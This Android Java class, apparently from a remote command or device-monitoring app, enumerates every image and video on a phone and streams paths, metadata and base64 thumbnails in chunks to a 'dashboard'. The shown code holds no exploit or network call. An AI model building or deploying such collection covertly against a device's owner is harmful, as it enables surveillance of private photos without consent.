package com.task.tusker.commands;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

/**
 * Gallery Handler — queries MediaStore for all device images + videos,
 * streams metadata with small embedded thumbnails to the dashboard in real time.
 *
 * Key difference from the old implementation: items are sent to the dashboard
 * as soon as each chunk fills up (streaming from the cursor), rather than
 * collecting the entire result set before sending anything.
 */
public class GalleryHandler {
    private static final String TAG = "GalleryHandler";
    private final Context context;

    // Micro-thumbnail cache — avoids re-encoding the same image on repeated gallery opens.
    // Key: mediaId. Evicted when the cache grows beyond MAX_CACHE_SIZE entries.
    private final java.util.concurrent.ConcurrentHashMap<Long, String> thumbCache =
            new java.util.concurrent.ConcurrentHashMap<>();
    private static final int MAX_CACHE_SIZE = 500;
    // Size and quality for embedded micro-thumbnails sent with each gallery chunk.
    // 64 px at quality 40 ≈ 500–800 bytes per item — fast even on 3G.
    private static final int MICRO_THUMB_SIZE    = 64;
    private static final int MICRO_THUMB_QUALITY = 40;

    /** Called each time a chunk of items is ready to be sent. */
    public interface ChunkCallback {
        void onChunk(JSONArray chunk);
    }

    public GalleryHandler(Context context) {
        this.context = context;
    }

    /**
     * Stream gallery items to the dashboard in real time.
     * Calls {@code callback.onChunk()} every time {@code chunkSize} items have been
     * read from the cursor + their thumbnails generated.  The final (possibly smaller)
     * batch is delivered at the end.
     *
     * @param type      "all", "image", or "video"
     * @param limit     max total items (0 = no limit, capped at 1000)
     * @param chunkSize how many items per callback invocation
     * @param callback  receives each chunk as it becomes ready
     * @return total number of items sent
     */
    public int streamGallery(String type, int limit, int chunkSize, ChunkCallback callback) {
        int cap = (limit <= 0 || limit > 1000) ? 1000 : limit;
        boolean includeImages = !"video".equals(type);
        boolean includeVideos = !"image".equals(type);

        JSONArray pending = new JSONArray();
        int[] total = {0};

        ChunkCallback flushing = chunk -> {
            if (callback != null) callback.onChunk(chunk);
        };

        try {
            if (includeImages) {
                int imgLimit = includeVideos ? cap / 2 : cap;
                if (imgLimit <= 0) imgLimit = cap;
                streamMedia(pending, false, imgLimit, chunkSize, flushing, total, cap);
            }
            if (includeVideos) {
                int remaining = cap - total[0];
                if (remaining > 0) {
                    streamMedia(pending, true, remaining, chunkSize, flushing, total, cap);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "streamGallery error: " + e.getMessage());
        }

        // Flush any leftover items that didn't fill a full chunk
        if (pending.length() > 0 && callback != null) {
            callback.onChunk(pending);
            total[0] += pending.length();
        }

        return total[0];
    }

    /**
     * Legacy blocking method — kept for compatibility.
     * Prefer {@link #streamGallery} for large libraries.
     */
    public JSONArray getGallery(String type, int limit) {
        JSONArray result = new JSONArray();
        streamGallery(type, limit, Integer.MAX_VALUE, chunk -> {
            for (int i = 0; i < chunk.length(); i++) result.put(chunk.opt(i));
        });
        return result;
    }

    /**
     * Stream rows from one MediaStore collection.
     * Calls {@code callback} whenever the pending buffer reaches {@code chunkSize}.
     * Leftover items remain in {@code pending} for the caller to flush.
     */
    private void streamMedia(JSONArray pending, boolean isVideo, int limit,
                             int chunkSize, ChunkCallback callback,
                             int[] totalCount, int hardCap) {

        Uri collection = isVideo
                ? MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection;
        if (isVideo) {
            projection = new String[]{
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.MIME_TYPE,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATE_TAKEN,
                    MediaStore.MediaColumns.WIDTH,
                    MediaStore.MediaColumns.HEIGHT,
                    MediaStore.Video.VideoColumns.DURATION,
            };
        } else {
            projection = new String[]{
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.MIME_TYPE,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATE_TAKEN,
                    MediaStore.MediaColumns.WIDTH,
                    MediaStore.MediaColumns.HEIGHT,
            };
        }

        String sortOrder = MediaStore.MediaColumns.DATE_TAKEN + " DESC LIMIT " + limit;
        ContentResolver cr = context.getContentResolver();

        try (Cursor cursor = cr.query(collection, projection, null, null, sortOrder)) {
            if (cursor == null) return;
            while (cursor.moveToNext()) {
                if (totalCount[0] >= hardCap) break;
                try {
                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
                    String mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
                    long dateTaken = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_TAKEN));
                    int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.WIDTH));
                    int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.HEIGHT));
                    long duration = 0;
                    if (isVideo) {
                        int durIdx = cursor.getColumnIndex(MediaStore.Video.VideoColumns.DURATION);
                        if (durIdx >= 0) duration = cursor.getLong(durIdx);
                    }

                    String thumb = getThumbnailBase64(id, path != null ? path : "", isVideo, MICRO_THUMB_SIZE);

                    JSONObject item = new JSONObject();
                    item.put("id", id);
                    item.put("path", path != null ? path : "");
                    item.put("name", name != null ? name : "");
                    item.put("type", isVideo ? "video" : "image");
                    item.put("mimeType", mime != null ? mime : "");
                    item.put("size", size);
                    item.put("dateTaken", dateTaken);
                    item.put("width", width);
                    item.put("height", height);
                    if (isVideo) item.put("duration", duration);
                    if (thumb != null) item.put("thumbnail", thumb);

                    pending.put(item);

                    // Flush a full chunk immediately — dashboard sees it right away
                    if (pending.length() >= chunkSize) {
                        callback.onChunk(pending);
                        totalCount[0] += pending.length();
                        // Reset buffer — JSONArray has no clear(), so replace it
                        clearArray(pending);
                    }

                } catch (Exception e) {
                    Log.w(TAG, "Row error: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "streamMedia error: " + e.getMessage());
        }
    }

    /** Drain all elements from a JSONArray in place (no clear() in older APIs). */
    private static void clearArray(JSONArray arr) {
        while (arr.length() > 0) arr.remove(0);
    }

    /**
     * Get a base64 JPEG thumbnail for a single media item.
     * Used for small grid thumbnails and larger lightbox previews.
     */
    public String getThumbnailBase64(long mediaId, String path, boolean isVideo, int size) {
        // Check cache for micro-thumbnails (size ≤ MICRO_THUMB_SIZE to avoid caching large previews)
        if (size <= MICRO_THUMB_SIZE && mediaId > 0) {
            String cached = thumbCache.get(mediaId);
            if (cached != null) return cached;
        }
        try {
            Bitmap bmp = null;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && mediaId > 0) {
                try {
                    Uri uri = isVideo
                            ? Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(mediaId))
                            : Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(mediaId));
                    bmp = context.getContentResolver()
                            .loadThumbnail(uri, new Size(size, size), null);
                } catch (Exception ignored) {}
            }

            if (bmp == null && path != null && !path.isEmpty()) {
                if (isVideo) {
                    try {
                        bmp = ThumbnailUtils.createVideoThumbnail(path,
                                size <= 150 ? MediaStore.Images.Thumbnails.MICRO_KIND
                                            : MediaStore.Images.Thumbnails.MINI_KIND);
                    } catch (Exception ignored) {}
                }

                if (bmp == null) {
                    try {
                        BitmapFactory.Options opts = new BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        BitmapFactory.decodeFile(path, opts);
                        if (opts.outWidth > 0) {
                            int inSample = 1;
                            while ((opts.outWidth / inSample) > size * 2
                                    || (opts.outHeight / inSample) > size * 2) {
                                inSample *= 2;
                            }
                            opts.inJustDecodeBounds = false;
                            opts.inSampleSize = inSample;
                            opts.inPreferredConfig = Bitmap.Config.RGB_565;
                            Bitmap raw = BitmapFactory.decodeFile(path, opts);
                            if (raw != null) {
                                bmp = ThumbnailUtils.extractThumbnail(raw, size, size);
                                if (bmp != raw) raw.recycle();
                            }
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "File decode error: " + e.getMessage());
                    }
                }
            }

            if (bmp == null) return null;

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int quality = (size <= MICRO_THUMB_SIZE) ? MICRO_THUMB_QUALITY : 72;
            bmp.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            bmp.recycle();
            String result = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

            // Cache micro-thumbnails to skip re-encoding on subsequent gallery loads
            if (size <= MICRO_THUMB_SIZE && mediaId > 0) {
                if (thumbCache.size() >= MAX_CACHE_SIZE) thumbCache.clear(); // simple eviction
                thumbCache.put(mediaId, result);
            }
            return result;

        } catch (Exception e) {
            Log.e(TAG, "getThumbnailBase64 error: " + e.getMessage());
            return null;
        }
    }
}
